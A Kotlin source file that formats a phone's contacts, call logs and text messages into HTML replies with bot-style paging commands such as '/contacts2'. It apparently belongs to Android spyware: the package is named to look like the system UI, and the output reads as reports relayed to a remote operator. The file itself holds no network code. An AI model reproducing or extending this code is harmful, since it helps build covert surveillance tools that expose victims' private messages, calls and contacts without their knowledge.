package com.systemui.relay.utils

import com.systemui.relay.model.CallLogEntry
import com.systemui.relay.model.Contact
import com.systemui.relay.model.SmsMessage

object MessageFormatter {
    private val circledNumbers = listOf("①","②","③","④","⑤","⑥","⑦","⑧","⑨","⑩")

    fun formatContacts(contacts: List<Contact>, page: Int, total: Int): String {
        if (contacts.isEmpty()) return "📭 No contacts found."
        val start = (page - 1) * 50 + 1
        val end = minOf(start + 49, total)
        val sb = StringBuilder()
        sb.append("<b>📒 CONTACTS</b> (showing $start-$end of $total)\n\n")
        contacts.forEachIndexed { idx, c ->
            sb.append("${start + idx}. ${escapeHtml(c.name)} — ${escapeHtml(c.phoneNumber)}\n")
        }
        if (end < total) sb.append("\n➡️ Reply /contacts${page + 1} for next 50")
        return sb.toString()
    }

    fun formatCallLogs(logs: List<CallLogEntry>, date: String): String {
        if (logs.isEmpty()) return "📭 No call logs for $date."
        val sb = StringBuilder()
        sb.append("<b>📞 CALL LOG — ${date.replaceFirstChar { it.uppercase() }}</b> (${logs.size} calls)\n\n")
        logs.forEach { c ->
            val icon = when (c.type) { "INCOMING" -> "🟢"; "OUTGOING" -> "🔴"; "MISSED" -> "⚫"; else -> "⬜" }
            sb.append("$icon ${c.time} | ${c.type} | ${escapeHtml(c.name)} | ${formatDuration(c.durationSec)}\n")
        }
        return sb.toString()
    }

    fun formatSms(messages: List<SmsMessage>, page: Int): String {
        if (messages.isEmpty()) return "📭 No messages found."
        val start = (page - 1) * 10 + 1
        val sb = StringBuilder()
        sb.append("<b>💬 MESSAGES</b> ($start-${start + messages.size - 1})\n\n")
        messages.forEachIndexed { idx, m ->
            val num = circledNumbers.getOrElse(idx) { "${start + idx}" }
            sb.append("$num ${m.date} | ${escapeHtml(m.name)}\n")
            sb.append("${escapeHtml(truncateBody(m.body))}\n\n")
        }
        return sb.toString()
    }

    private fun escapeHtml(t: String): String = t.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    private fun formatDuration(s: Int): String = if (s <= 0) "—" else { val m = s/60; val sec = s%60; if (m>0) "${m}m ${sec}s" else "${sec}s" }
    private fun truncateBody(b: String, m: Int = 120): String = if (b.length > m) b.take(m) + "..." else b
}